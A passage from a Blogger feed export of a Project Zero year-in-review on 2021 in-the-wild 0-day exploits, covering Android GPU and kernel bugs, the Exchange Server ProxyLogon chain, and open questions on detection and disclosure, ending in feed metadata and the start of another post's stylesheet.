Qualcomm Adreno GPU or the ARM Mali GPU. &lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c2"&gt;&lt;span class="HNYIspzEBn-c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c5"&gt;&lt;span&gt;Public security research mirrored this choice in the last couple of years as well. &lt;/span&gt;&lt;span&gt;When developing full exploit chains&lt;/span&gt;&lt;span&gt;&amp;nbsp;(for defensive purposes) to target Android devices, &lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://github.com/secmob/TiYunZong-An-Exploit-Chain-to-Remotely-Root-Modern-Android-Devices/blob/master/us-20-Gong-TiYunZong-An-Exploit-Chain-to-Remotely-Root-Modern-Android-Devices-wp.pdf"&gt;Guang Gong&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://securitylab.github.com/research/one_day_short_of_a_fullchain_android/"&gt;Man Yue Mo&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, and &lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://googleprojectzero.blogspot.com/2020/09/attacking-qualcomm-adreno-gpu.html"&gt;Ben Hawkes&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;all chose to attack the GPU kernel driver for local privilege escalation. Seeing the in-the-wild 0-days also target the GPU was more of a confirmation rather than a revelation. Of the &lt;/span&gt;&lt;span&gt;5 0-days targeting &lt;/span&gt;&lt;span class="HNYIspzEBn-c0"&gt;GPU drivers, 3 were in the Qualcomm Adreno driver and 2 in the ARM Mali driver. &lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c2"&gt;&lt;span class="HNYIspzEBn-c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c5"&gt;&lt;span&gt;The two non-GPU driver 0-days (&lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://source.android.com/security/bulletin/2021-11-01#kernel-components"&gt;CVE-2021-0920&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2021/CVE-2021-1048.html"&gt;CVE-2021-1048&lt;/a&gt;&lt;/span&gt;&lt;span&gt;) targeted the upstream Linux kernel. Unfortunately, these 2 bugs shared a singular characteristic with the Android in-the-wild 0-day seen in 2019: all 3 were previously known upstream before their exploitation in Android. While the sample size is small, it&amp;rsquo;s still quite &lt;/span&gt;&lt;span&gt;striking&lt;/span&gt;&lt;span&gt;&amp;nbsp;to see that 100% of the known in-the-wild Android 0-days that target the kernel &lt;/span&gt;&lt;span&gt;are bugs that actually were known about before their exploitation.&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c2"&gt;&lt;span class="HNYIspzEBn-c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c5"&gt;&lt;span&gt;The vulnerability now referred to as &lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://source.android.com/security/bulletin/2021-11-01#kernel-components"&gt;CVE-2021-0920&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;was actually found in September 2016 and &lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://lore.kernel.org/lkml/CAOssrKcfncAYsQWkfLGFgoOxAQJVT2hYVWdBA6Cw7hhO8RJ_wQ@mail.gmail.com/"&gt;discussed on the Linux kernel mailing lists&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. A &lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://lore.kernel.org/lkml/1475150954-10152-1-git-send-email-mszeredi@redhat.com/"&gt;patch was even developed back in 2016&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, but it didn&amp;rsquo;t end up being submitted. The bug was finally &lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=cbcf01128d0a92e131bd09f1688fe032480b65ca"&gt;fixed in the Linux kernel in July 2021&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;after the detection of the in-the-wild exploit targeting Android. The patch then made it into the &lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://source.android.com/security/bulletin/2021-11-01#kernel-components"&gt;Android security bulletin in November 2021&lt;/a&gt;&lt;/span&gt;&lt;span class="HNYIspzEBn-c0"&gt;.&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c2"&gt;&lt;span class="HNYIspzEBn-c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c5"&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2021/CVE-2021-1048.html"&gt;CVE-2021-1048&lt;/a&gt;&lt;/span&gt;&lt;span class="HNYIspzEBn-c0"&gt;&amp;nbsp;remained unpatched in Android for 14 months after it was patched in the Linux kernel. The Linux kernel was actually only vulnerable to the issue for a few weeks, but due to Android patching practices, that few weeks became almost a year for some Android devices. If an Android OEM synced to the upstream kernel, then they likely were patched against the vulnerability at some point. But many devices, such as recent Samsung devices, had not and thus were left vulnerable.&lt;/span&gt;&lt;/p&gt;&lt;h2 class="HNYIspzEBn-c7" id="h.go76pditpwq7"&gt;&lt;span&gt;Microsoft &lt;/span&gt;&lt;span&gt;Exchange Server&lt;/span&gt;&lt;/h2&gt; &lt;p class="HNYIspzEBn-c5"&gt;&lt;span&gt;In 2021, there were 5 in-the-wild 0-days targeting Microsoft Exchange Server. This is the first time any Exchange Server in-the-wild 0-days have been detected and disclosed since we began tracking in-the-wild 0-days. The first four (&lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2021/CVE-2021-26855.html"&gt;CVE-2021-26855&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26857"&gt;CVE-2021-26857&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26858"&gt;CVE-2021-26858&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, and &lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-27065"&gt;CVE-2021-27065&lt;/a&gt;&lt;/span&gt;&lt;span&gt;) &amp;nbsp;were all disclosed and patched at the same time and used together in a &lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/"&gt;single operation&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. &lt;/span&gt;&lt;span&gt;The fifth (&lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-42321"&gt;CVE-2021-42321&lt;/a&gt;&lt;/span&gt;&lt;span&gt;) was patched on its own in November 2021. &lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-42321"&gt;CVE-2021-42321&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;was demonstrated at Tianfu Cup and then discovered in-the-wild by Microsoft. While no other in-the-wild 0-days were disclosed as part of the chain with &lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-42321"&gt;CVE-2021-42321&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, the attackers would have required at least another 0-day for successful exploitation since &lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-42321"&gt;CVE-2021-42321&lt;/a&gt;&lt;/span&gt;&lt;span class="HNYIspzEBn-c0"&gt;&amp;nbsp;is a post-authentication bug.&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c2"&gt;&lt;span class="HNYIspzEBn-c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c5"&gt;&lt;span&gt;Of the four Exchange in-the-wild 0-days used in the first campaign, &lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2021/CVE-2021-26855.html"&gt;CVE-2021-26855&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, which is also known as &amp;ldquo;ProxyLogon&amp;rdquo;, is the only one that&amp;rsquo;s pre-auth. &lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2021/CVE-2021-26855.html"&gt;CVE-2021-26855&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;is a server side request forgery (SSRF) vulnerability that allows unauthenticated attackers to send arbitrary HTTP requests as the Exchange server. The other three vulnerabilities were post-authentication. For example, &lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26858"&gt;CVE-2021-26858&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-27065"&gt;CVE-2021-27065&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;allowed attackers to write arbitrary files to the system. &lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26857"&gt;CVE-2021-26857&lt;/a&gt;&lt;/span&gt;&lt;span class="HNYIspzEBn-c0"&gt;&amp;nbsp;is a remote code execution vulnerability due to a deserialization bug in the Unified Messaging service. This allowed attackers to run code as the privileged SYSTEM user.&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c2"&gt;&lt;span class="HNYIspzEBn-c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c5"&gt;&lt;span&gt;For the second campaign, &lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-42321"&gt;CVE-2021-42321&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, like &lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26858"&gt;CVE-2021-26858&lt;/a&gt;&lt;/span&gt;&lt;span class="HNYIspzEBn-c0"&gt;, is a post-authentication RCE vulnerability due to insecure deserialization. It seems that while attempting to harden Exchange, Microsoft inadvertently introduced another deserialization vulnerability.&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c2"&gt;&lt;span class="HNYIspzEBn-c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c5"&gt;&lt;span&gt;While there were a significant amount of 0-days in Exchange detected and disclosed in 2021, it&amp;rsquo;s important to remember that they were all used as 0-day in only two different campaigns. &lt;/span&gt;&lt;span&gt;This is an example of why we don&amp;rsquo;t suggest &lt;/span&gt;&lt;span&gt;using the number&lt;/span&gt;&lt;span class="HNYIspzEBn-c0"&gt;&amp;nbsp;of 0-days in a product as a metric to assess the security of a product. Requiring the use of four 0-days for attackers to have success is preferable to an attacker only needing one 0-day to successfully gain access.&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c2"&gt;&lt;span class="HNYIspzEBn-c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c5"&gt;&lt;span&gt;While this is the first time Exchange in-the-wild 0-days have been detected and disclosed&lt;/span&gt;&lt;span&gt;&amp;nbsp;since Project Zero began our tracking, this is not unexpected. In 2020 there was &lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://www.cisa.gov/uscert/ncas/current-activity/2020/03/10/unpatched-microsoft-exchange-servers-vulnerable-cve-2020-0688"&gt;n-day exploitation of Exchange Servers&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. Whether this was the first year that attackers began the 0-day exploitation or if this was the first year that defenders began detecting the 0-day exploitation, this is not an unexpected evolution and we&amp;rsquo;ll likely see it continue into 2022.&lt;/span&gt;&lt;/p&gt;&lt;h1 class="HNYIspzEBn-c11" id="h.1cg90di44ry5"&gt;&lt;span&gt;Outstanding Questions&lt;/span&gt;&lt;/h1&gt; &lt;p class="HNYIspzEBn-c5"&gt;&lt;span class="HNYIspzEBn-c0"&gt;While there has been progress on detection and disclosure, that progress has shown just how much work there still is to do. The more data we gained, the more questions that arose about biases in detection, what we&amp;rsquo;re missing and why, and the need for more transparency from both vendors and researchers.&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c2"&gt;&lt;span class="HNYIspzEBn-c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c5"&gt;&lt;span&gt;Until the day that attackers decide to happily share all their exploits with us, we can&amp;rsquo;t fully know what percentage of 0-days are &lt;/span&gt;&lt;span&gt;publicly known about&lt;/span&gt;&lt;span class="HNYIspzEBn-c0"&gt;. However when we pull together our expertise as security researchers and anecdotes from others in the industry, it paints a picture of some of the data we&amp;rsquo;re very likely missing. From that, these are some of the key questions we&amp;rsquo;re asking ourselves as we move into 2022:&lt;/span&gt;&lt;/p&gt;&lt;h2 class="HNYIspzEBn-c7" id="h.9mkiyelw2l4a"&gt;&lt;span class="HNYIspzEBn-c12"&gt;Where are the [x] 0-days?&lt;/span&gt;&lt;/h2&gt; &lt;p class="HNYIspzEBn-c5"&gt;&lt;span class="HNYIspzEBn-c0"&gt;Despite the number of 0-days found in 2021, there are key targets missing from the 0-days discovered. For example, we know that messaging applications like WhatsApp, Signal, Telegram, etc. are targets of interest to attackers and yet there&amp;rsquo;s only 1 messaging app, in this case iMessage, 0-day found this past year. Since we began tracking in mid-2014 the total is two: a WhatsApp 0-day in 2019 and this iMessage 0-day found in 2021.&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c2"&gt;&lt;span class="HNYIspzEBn-c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c5"&gt;&lt;span&gt;Along with messaging apps, there are other platforms/targets we&amp;rsquo;d expect to see 0-days targeting, yet there are no or very few public examples. For example, since mid-2014 there&amp;rsquo;s only one in-the-wild 0-day each for macOS and &lt;/span&gt;&lt;span&gt;Linux&lt;/span&gt;&lt;span class="HNYIspzEBn-c0"&gt;. There are no known in-the-wild 0-days targeting cloud, CPU vulnerabilities, or other phone components such as the WiFi chip or the baseband.&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c2"&gt;&lt;span class="HNYIspzEBn-c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c5"&gt;&lt;span&gt;This leads to the question of whether these 0-days are absent due to lack of detection, lack of disclosure, or both?&lt;/span&gt;&lt;/p&gt;&lt;h2 class="HNYIspzEBn-c7" id="h.lmeqy4ji80fr"&gt;&lt;span class="HNYIspzEBn-c12"&gt;Do some vendors have no known in-the-wild 0-days because they&amp;rsquo;ve never been found or because they don&amp;rsquo;t publicly disclose?&lt;/span&gt;&lt;/h2&gt; &lt;p class="HNYIspzEBn-c5"&gt;&lt;span&gt;Unless a vendor has told us that they will publicly disclose exploitation status for all vulnerabilities in their platforms, we, the public, don&amp;rsquo;t know if the absence of an annotation means that there is no known exploitation of a vulnerability or if there is, but the vendor is just not sharing that information publicly. &lt;/span&gt;&lt;span&gt;Thankfully this question is something that has a pretty clear solution: all device and software vendors agreeing to publicly disclose when there is evidence to suggest that a vulnerability in their product is being exploited in-the-wild.&lt;/span&gt;&lt;/p&gt;&lt;h2 class="HNYIspzEBn-c7" id="h.dckkx2d1dyz5"&gt;&lt;span class="HNYIspzEBn-c12"&gt;Are we seeing the same bug patterns because that&amp;rsquo;s what we know how to detect?&lt;/span&gt;&lt;/h2&gt; &lt;p class="HNYIspzEBn-c5"&gt;&lt;span&gt;As we described earlier in this report, all the 0-days we saw in 2021 had similarities to previously seen vulnerabilities. This leads us to wonder whether or not that&amp;rsquo;s actually representative of what attackers are using. Are attackers actually having success exclusively using vulnerabilities in bug classes and components that are previously public? Or are we detecting all these 0-days with known bug patterns because that&amp;rsquo;s what we know how to detect? Public security research would suggest that yes, attackers are still able to have success with using vulnerabilities in known components and bug classes the majority of the time. But we&amp;rsquo;d still expect to see a few novel and unexpected vulnerabilities in the grouping. We posed this question back in the 2019 year-in-review and it still lingers. &lt;/span&gt;&lt;/p&gt;&lt;h2 class="HNYIspzEBn-c7" id="h.w9alsmed3bqy"&gt;&lt;span class="HNYIspzEBn-c12"&gt;Where are the spl0itz?&lt;/span&gt;&lt;/h2&gt; &lt;p class="HNYIspzEBn-c5"&gt;&lt;span class="HNYIspzEBn-c0"&gt;To successfully exploit a vulnerability there are two key pieces that make up that exploit: the vulnerability being exploited, and the exploitation method (how that vulnerability is turned into something useful). &lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c2"&gt;&lt;span class="HNYIspzEBn-c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c5"&gt;&lt;span&gt;Unfortunately, this report could only really analyze one of these components: the vulnerability. Out of the 58 0-days, only 5 have an exploit sample publicly available. Discovered in-the-wild 0-days are the failure case for attackers and a key opportunity for defenders to learn what attackers are doing and make it harder, more time-intensive, more costly, to do it again. Yet without the exploit sample or a detailed technical write-up based upon the sample, we can only focus on fixing the vulnerability rather than also mitigating the exploitation method. This means that attackers are able to continue to use their existing exploit methods rather than having to go back to the design and development phase to build a new exploitation method. While acknowledging that sharing exploit samples can be challenging (we have that challenge too!), we hope in 2022 there will be more &lt;/span&gt;&lt;span&gt;sharing of exploit samples or detailed technical write-ups so that we can come together to use every possible piece of information to make it harder for the attackers to exploit more users.&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c2"&gt;&lt;span class="HNYIspzEBn-c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c5"&gt;&lt;span&gt;As an aside, if you have an exploit sample that you&amp;rsquo;re willing to share with us, please reach out. Whether it&amp;rsquo;s sharing with us and having us write a detailed technical description and analysis or having us share it publicly, we&amp;rsquo;d be happy to work with you.&lt;/span&gt;&lt;/p&gt;&lt;h1 class="HNYIspzEBn-c11" id="h.e19lp542ae55"&gt;&lt;span&gt;Conclusion&lt;/span&gt;&lt;/h1&gt; &lt;p class="HNYIspzEBn-c5"&gt;&lt;span&gt;Looking back on 2021, what comes to mind is &lt;/span&gt;&lt;span&gt;&amp;ldquo;baby steps&lt;/span&gt;&lt;span class="HNYIspzEBn-c0"&gt;&amp;rdquo;. We can see clear industry improvement in the detection and disclosure of 0-day exploits. But the better detection and disclosure has highlighted other opportunities for progress. As an industry we&amp;rsquo;re not making 0-day hard. Attackers are having success using vulnerabilities similar to what we&amp;rsquo;ve seen previously and in components that have previously been discussed as attack surfaces.The goal is to force attackers to start from scratch each time we detect one of their exploits: they&amp;rsquo;re forced to discover a whole new vulnerability, they have to invest the time in learning and analyzing a new attack surface, they must develop a brand new exploitation method. &amp;nbsp;And while we made distinct progress in detection and disclosure it has shown us areas where that can continue to improve.&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c2"&gt;&lt;span class="HNYIspzEBn-c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c5"&gt;&lt;span&gt;While this all may seem daunting, the promising part is that we&amp;rsquo;ve done it before: we have made clear progress on previously daunting goals. In 2019, we discussed the large detection deficit for 0-day exploits and 2 years later more than double were detected and disclose&lt;/span&gt;&lt;span&gt;d&lt;/span&gt;&lt;span class="HNYIspzEBn-c0"&gt;. So while there is still plenty more work to do, it&amp;rsquo;s a tractable problem. There are concrete steps that the tech and security industries can take to make it even more progress:&lt;br&gt;&lt;/span&gt;&lt;/p&gt;&lt;ol class="c6 lst-kix_czzguda5pqu4-0 start" start="1"&gt;&lt;li style="margin-left: 46pt;" class="c4 li-bullet-0"&gt;&lt;span class="HNYIspzEBn-c0"&gt;Make it an industry standard behavior for all vendors to publicly disclose when there is evidence to suggest that a vulnerability in their product is being exploited,&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c4 li-bullet-0"&gt;&lt;span class="HNYIspzEBn-c0"&gt;Vendors and security researchers sharing exploit samples or detailed descriptions of the exploit techniques.&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c4 li-bullet-0"&gt;&lt;span class="HNYIspzEBn-c0"&gt;Continued concerted efforts on reducing memory corruption vulnerabilities or rendering them unexploitable.&lt;/span&gt;&lt;/li&gt;&lt;/ol&gt; &lt;p class="HNYIspzEBn-c2"&gt;&lt;span class="HNYIspzEBn-c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c5"&gt;&lt;span&gt;Through 2021 we continually saw the real world impacts of the use of 0-day exploits against users and entities. Amnesty International, the Citizen Lab, and others highlighted &lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://citizenlab.ca/2021/10/breaking-news-new-york-times-journalist-ben-hubbard-pegasus/"&gt;over&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://www.amnesty.org/en/documents/doc10/4491/2021/en/"&gt;over&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;how governments were using commercial surveillance products against &lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://forbiddenstories.org/pegasus-the-new-global-weapon-for-silencing-journalists/"&gt;journalists&lt;/a&gt;&lt;/span&gt;&lt;span&gt;,&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://www.amnesty.org/en/latest/research/2021/11/devices-of-palestinian-human-rights-defenders-hacked-with-nso-groups-pegasus-spyware-2/"&gt;human rights defenders&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, and &lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://www.reuters.com/technology/exclusive-us-state-department-phones-hacked-with-israeli-company-spyware-sources-2021-12-03/"&gt;government officials&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. We saw many enterprises scrambling to remediate and protect themselves from the&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/"&gt;Exchange Server 0-days&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. And we even learned of peer &lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://blog.google/threat-analysis-group/update-campaign-targeting-security-researchers/"&gt;security researchers being targeted by &lt;/a&gt;&lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://blog.google/threat-analysis-group/update-campaign-targeting-security-researchers/"&gt;North Korean government hackers&lt;/a&gt;&lt;/span&gt;&lt;span class="HNYIspzEBn-c0"&gt;. While the majority of people on the planet do not need to worry about their own personal risk of being targeted with 0-days, 0-day exploitation still affects us all. These 0-days tend to have an outsized impact on society so we need to continue doing whatever we can to make it harder for attackers to be successful in these attacks.&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c2"&gt;&lt;span class="HNYIspzEBn-c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c5"&gt;&lt;span&gt;2021 showed us we&amp;rsquo;re on the right track and making progress, but there&amp;rsquo;s plenty more to be done to make &lt;/span&gt;&lt;span&gt;0-day&lt;/span&gt;&lt;span class="HNYIspzEBn-c0"&gt;&amp;nbsp;hard.&lt;/span&gt;&lt;/p&gt;</content>
    <link rel="replies" type="application/atom+xml" href="https://googleprojectzero.blogspot.com/feeds/3023870154175197326/comments/default" title="Post Comments" />
    <link rel="replies" type="text/html" href="https://googleprojectzero.blogspot.com/2022/04/the-more-you-know-more-you-know-you.html#comment-form" title="0 Comments" />
    <link rel="edit" type="application/atom+xml" href="https://www.blogger.com/feeds/4838136820032157985/posts/default/3023870154175197326" />
    <link rel="self" type="application/atom+xml" href="https://www.blogger.com/feeds/4838136820032157985/posts/default/3023870154175197326" />
    <link rel="alternate" type="text/html" href="https://googleprojectzero.blogspot.com/2022/04/the-more-you-know-more-you-know-you.html" title="The More You Know, The More You Know You Don’t Know" />
    <author>
      <name>Ryan</name>
      <uri>http://www.blogger.com/profile/17011901605865574886</uri>
      <email>noreply@blogger.com</email>
      <gd:image rel="http://schemas.google.com/g/2005#thumbnail" width="16" height="16" src="https://img1.blogblog.com/img/b16-rounded.gif" />
    </author>
    <media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiM4gCoxLJVRGTOOAa0G44m0K7JF0hFFDI02iBV7REJruq3uiZof8wNylU1aNxOte2oEhhj_5JM9tS0VOwgA-eiKIaQ_DdmTQtlC9OUKSRA6kes4_d_-BKyeZsJ2bxISU2HJmZRG-_kVtKguVM8-eo7mbHl1_zs8DUGnY5mD-BiWYz6ayl472_aq7G_wQ/s72-c/image1.png" height="72" width="72" />
    <thr:total>0</thr:total>
  </entry>
  <entry>
    <id>tag:blogger.com,1999:blog-4838136820032157985.post-5933797027217125856</id>
    <published>2022-04-14T08:58:00.000-07:00</published>
    <updated>2022-04-14T08:58:26.446-07:00</updated>
    <title type="text">CVE-2021-1782, an iOS in-the-wild vulnerability in vouchers</title>
    <content type="html">&lt;style type="text/css"&gt;@import url('https://themes.googleusercontent.com/fonts/css?kit=lhDjYqiy3mZ0x6ROQEUoUw');ol{margin:0;padding:0}table td,table th{padding:0}.BGLtzooHlW-c13{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#e0e0e0;border-top-width:1pt;border-right-width:1pt;border-left-color:#e0e0e0;vertical-align:top;border-right-color:#e0e0e0;border-left-width:1pt;border-top-style:solid;background-color:#fafafa;border-left-style:solid;border-bottom-width:1pt;width:468pt;border-top-color:#e0e0e0;border-bottom-style:solid}.BGLtzooHlW-c3{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:10pt;font-family:Consolas,"Courier New";font-style:normal}.BGLtzooHlW-c10{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Arial";font-style:normal}.BGLtzooHlW-c20{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:16pt;font-family:"Arial";font-style:normal}.BGLtzooHlW-c26{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Arial"}.BGLtzooHlW-c9{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;color:#1155cc;font-weight:700;text-decoration:underline}.BGLtzooHlW-c18{padding-top:18pt;padding-bottom:6pt;line-height:1.5;page-break-after:avoid;text-align:left}.BGLtzooHlW-c19{color:#000000;text-decoration:none;vertical-align:baseline;font-size:11pt;font-style:normal}.BGLtzooHlW-c16{font-size:10pt;font-family:Consolas,"Courier New";color:#0f9d58;font-weight:400}.BGLtzooHlW-c2{font-size:10pt;font-family:Consolas,"Courier New";color:#616161;font-weight:400}.BGLtzooHlW-c7{font-size:10pt;font-family:Consolas,"Courier New";color:#455a64;font-weight:400}.BGLtzooHlW-c0{padding-top:0pt;padding-bottom:0pt;line-height:1.5;text-align:left}.BGLtzooHlW-c4{font-size:10pt;font-family:Consolas,"Courier New";color:#000000;font-weight:400}.BGLtzooHlW-c15{font-size:10pt;font-family:Consolas,"Courier 